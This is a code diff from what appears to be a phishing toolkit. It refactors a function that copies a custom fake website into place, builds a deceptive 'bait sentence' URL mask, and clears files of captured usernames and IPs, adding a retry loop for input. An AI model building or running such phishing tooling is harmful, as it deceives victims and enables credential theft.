@@ -562,20 +562,20 @@ def url_manager(url, arg1, arg2):
 # Copy website files from custom location
 def customfol():
     global mask
-    fol = input(f"\n{ask}Enter the directory > {green}")
-    inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
-    # Remove slash and spaces from mask
-    mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
-    if isdir(fol):
-        if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html") :
-            delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
-            copy(fol, site_dir)
+    while True:
+        fol = input(f"\n{ask}Enter the directory > {green}")
+        if isdir(fol):
+            if isfile(f"{fol}/index.php") or isfile(f"{fol}/index.html"):
+                inputmask = input(f"\n{ask}Enter a bait sentence (Example: free-money) > {green}")
+                # Remove slash and spaces from mask
+                mask = "https://" + sub("([/%+&?={} ])", "-", inputmask)
+                delete(f"{fol}/ip.txt", f"{fol}/usernames.txt")
+                copy(fol, site_dir)
+                return fol
+            else:
+                sprint(f"\n{error}index.php/index.html required but not found!")
         else:
-            sprint(f"\n{error}index.php/index.html required but not found!")
-            return
-    else:
-        sprint(f"\n{error}Directory do not exists!")
-        return
+            sprint(f"\n{error}Directory do not exists!")
 
 # Show saved data from saved file with small decoration
 def saved():
